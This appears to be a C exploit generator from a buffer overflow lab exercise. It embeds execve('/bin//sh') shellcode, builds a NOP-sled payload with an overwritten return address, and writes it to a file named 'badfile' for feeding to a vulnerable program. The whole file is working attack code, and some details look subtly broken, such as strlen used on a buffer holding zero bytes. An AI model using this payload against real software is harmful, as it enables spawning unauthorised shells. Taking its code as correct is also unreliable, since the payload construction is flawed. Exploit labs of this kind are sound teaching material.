#include <stdlib.h>
#include <stdio.h>
#include <string.h>

char code[]=
    "\x31\xc0"             /* xorl    %eax,%eax              */
    "\x50"                 /* pushl   %eax                   */
    "\x68""//sh"           /* pushl   $0x68732f2f            */
    "\x68""/bin"           /* pushl   $0x6e69622f            */
    "\x89\xe3"             /* movl    %esp,%ebx              */
    "\x50"                 /* pushl   %eax                   */
    "\x53"                 /* pushl   %ebx                   */
    "\x89\xe1"             /* movl    %esp,%ecx              */
    "\x99"                 /* cdq                            */
    "\xb0\x0b"             /* movb    $0x0b,%al              */
    "\xcd\x80"             /* int     $0x80                  */
;

int main(int argc, char ** argv) {
	char buffer[512];
	FILE *badfile;
	badfile = fopen("badfile", "w+");
	/* inint buffer with nope (0x90) */
	memset(&buffer,0x90,512);
    	//buffer[0x1b]=0xff;
    	//buffer[0x1a]=0xff;
    	//buffer[0x19]=0xcf;
    	*(unsigned int*)&(buffer[0x18])=(unsigned int)buffer;
    	memcpy(buffer+480, code, 24);
	/* saves to bad file*/
	fwrite(buffer, strlen(buffer), 1, badfile);

	fclose(badfile);

	printf("Completed writing\n");

	return 0;
}

